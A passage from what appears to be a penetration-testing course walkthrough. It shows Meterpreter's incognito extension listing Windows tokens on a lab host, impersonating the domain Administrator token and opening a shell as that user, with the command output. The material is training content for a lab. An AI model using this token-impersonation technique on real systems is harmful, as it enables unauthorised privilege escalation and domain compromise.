```
C:\\windows\\system32>
```

Listing 997 - Obtaining System shell

# 24.8.5      Post Exploitation Enumeration

We've already conducted some basic enumeration against the Cevapi target. During this stage, we will concentrate on getting closer to our stated goal, Domain Admin.

Earlier, we discovered that Cevapi is, in fact, joined to the sandbox.local domain. Let’s take a look to see if any domain accounts are logged in for us to impersonate their tokens. Similar to how we tested Poulsy, we will again use the incognito extension within meterpreter to list all available tokens.

```
C:\\windows\\system32>exit
exit

meterpreter > use incognito
Loading extension incognito...Success.

meterpreter > list_tokens -u

Delegation Tokens Available
===========================
CEVAPI\\cevapipadmin
CEVAPI\\jenkinssuser
Font Driver Host\\UMFD-0
Font Driver Host\\UMFD-1
NT AUTHORITY\\LOCAL SERVICE
NT AUTHORITY\\NETWORK SERVICE
NT AUTHORITY\\SYSTEM
sandbox\\Administrator
Window Manager\\DWM-1

Impersonation Tokens Available
===========================
NT AUTHORITY\\ANONYMOUS LOGON
```

Listing 998 - Listing tokens that can be impersonated

It appears that the sandbox.local administrator user is logged into Cevapi. Let’s try to impersonate this user to verify that we can escalate our privileges. To do this, we will use the impersonate_token command and specify the Administrator user. We will have to escape the “\\” character in order for Metasploit to read the command correctly.

```
meterpreter > impersonate_token sandbox\\Administrator
[+] Delegation token available
[+] Successfully impersonated user sandbox\\Administrator

meterpreter > getuid
Server username: sandbox\\Administrator

meterpreter > shell
Process 7276 created.
Channel 3 created.
Microsoft Windows [Version 10.0.15063]
```